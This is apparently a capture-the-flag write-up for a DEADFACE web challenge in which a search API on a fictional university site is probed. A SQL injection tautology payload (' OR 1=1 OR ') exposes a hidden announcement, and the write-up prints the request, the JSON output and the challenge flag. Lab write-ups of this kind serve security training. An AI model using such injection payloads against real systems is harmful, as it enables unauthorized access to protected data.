> [!abstract] Challenge Description
> > @syyntax
> ## 60
> DEADFACE was able to retrieve an announcement that was hidden by administrators. This announcement contained sensitive information (flag) that DEADFACE was able to compromise. Find the flag associated with the hidden announcement.
> 
> Submit the flag as `deadface{flag text}`.
> 
> [http://env01.deadface.io:8080](http://env01.deadface.io:8080/)

On the announcement page there's a hint: `Hidden announcements are not displayed in this interface. Database queries may reveal additional records...`

It is embedded so there's no url spoofing to be done.

In console, it suggests `http://env01.deadface.io:8080/api/search.php?q=test&type=announcements` doing this shows this result.
```json
{
    "status": "success",
    "type": "announcements",
    "query": "test",
    "count": 0,
    "results": []
}
```

`http://env01.deadface.io:8080/api/search.php?q=%20&type=announcements`
```json
{
    "status": "success",
    "type": "announcements",
    "query": " ",
    "count": 4,
    "results": [
        {
            "title": "Welcome to Fall 2025",
            "content": "Welcome back students! We are excited for another great semester at Night Vale University.",
            "author": "Dean Morrison",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Library Hours Extended",
            "content": "The university library will now be open until midnight on weekdays.",
            "author": "Library Services",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Campus Security Alert",
            "content": "Please report any suspicious activity to campus security immediately.",
            "author": "Campus Police",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Server Maintenance",
            "content": "Scheduled maintenance on October 28th from 2-4 AM.",
            "author": "IT Department",
            "posted_at": "2025-10-25 18:26:37"
        }
    ]
}
```

http://env01.deadface.io:8080/api/search.php?q=%27%20OR%201=1%20OR%20%27&type=announcements
`' OR 1=1 OR '`
```json
{
    "status": "success",
    "type": "announcements",
    "query": "' OR 1=1 OR '",
    "count": 5,
    "results": [
        {
            "title": "Welcome to Fall 2025",
            "content": "Welcome back students! We are excited for another great semester at Night Vale University.",
            "author": "Dean Morrison",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Library Hours Extended",
            "content": "The university library will now be open until midnight on weekdays.",
            "author": "Library Services",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Campus Security Alert",
            "content": "Please report any suspicious activity to campus security immediately.",
            "author": "Campus Police",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Restricted Access Notice",
            "content": "FLAG: deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}",
            "author": "System Administrator",
            "posted_at": "2025-10-25 18:26:37"
        },
        {
            "title": "Server Maintenance",
            "content": "Scheduled maintenance on October 28th from 2-4 AM.",
            "author": "IT Department",
            "posted_at": "2025-10-25 18:26:37"
        }
    ]
}
```

---
> [!success] Flag: `deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}`
